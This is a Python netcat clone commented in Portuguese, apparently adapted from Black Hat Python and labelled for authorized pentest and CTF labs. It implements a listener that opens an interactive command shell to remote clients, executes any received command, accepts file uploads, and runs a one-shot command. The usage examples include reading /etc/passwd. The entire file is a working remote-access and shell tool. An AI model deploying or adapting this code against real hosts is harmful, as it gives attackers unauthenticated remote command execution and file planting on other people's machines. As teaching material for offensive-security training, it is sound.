# Clone simplificado do netcat (Black Hat Python) para pentest/CTF em
# ambientes autorizados: shell reversa/bind, upload de arquivo e execucao
# remota de um unico comando, tudo via TCP puro.
#
# Uso:
#   netcat.py -t 192.168.1.108 -p 5555 -l -c            # abre shell de comando (modo listen)
#   netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # recebe upload de arquivo
#   netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd"  # executa 1 comando fixo
#   echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135     # envia texto (modo cliente)
#   netcat.py -t 192.168.1.108 -p 5555                   # conecta como cliente interativo
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    # ATENCAO: shlex.split evita "shell=True", mas ainda executa qualquer
    # comando recebido pela rede -- use somente em maquinas/labs proprios
    # ou com autorizacao explicita de teste (pentest/CTF).
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # SO_REUSEADDR permite reiniciar o script rapidamente sem esperar o
        # SO liberar a porta (evita erro "Address already in use")
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        # -l/--listen decide se este processo age como servidor (listen)
        # ou como cliente (send)
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def handle(self, client_socket):
        # trata cada modo de operacao (mutuamente exclusivos na pratica):
        # -e executa um comando fixo, -u recebe upload, -c abre shell interativa
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
                
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Arquivo {self.args.upload} salvo com sucesso.'
            client_socket.send(message.encode())

        elif self.args.command:
            # loop de shell de comando: manda um prompt, acumula bytes ate
            # achar '\n' (comando completo), executa e devolve a saida
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Servidor encerrado. {e}')
                    self.socket.close()
                    sys.exit()

    def send(self):
        # modo cliente: conecta ao alvo e, se houver dados no stdin
        # (ex.: echo 'ABC' | netcat.py ...), envia antes de entrar no loop
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # se recebemos menos que o tamanho maximo do buffer,
                    # provavelmente e o fim da resposta
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("User terminated.")
            self.socket.close()
            sys.exit()

    def listen(self):
        # modo servidor: liga (bind) na interface/porta escolhidas e aceita
        # multiplas conexoes, cada uma tratada em sua propria thread
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Netcat Replacement",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplo:
        netcat.py -t 192.168.1.108 -p 5555 -l -c # shell de comando
        netcat.py -t  192.168.1.108 -p 5555 -l  -u=mytest.txt # upload do arquivo
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # executar comando
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # enviar texto para a porta 135 do servidor
        netcat.py -t 192.168.1.108 -p 5555 # conectar ao servidor
        '''))
    parser.add_argument("-c", "--command", action="store_true", help="shell de comando")
    parser.add_argument("-e", "--execute", help="executar comando especifico")
    parser.add_argument("-l", "--listen", action="store_true", help="ouvir")
    parser.add_argument("-p", "--port", type=int, default=5555, help="porta especifica")
    parser.add_argument("-t", "--target", default="192.168.1.203", help="IP especifico")
    parser.add_argument("-u", "--upload", help="caminho do arquivo para upload")
    args = parser.parse_args()
    # -t tem um IP padrao de exemplo; sempre passe -t <seu_alvo> explicitamente
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()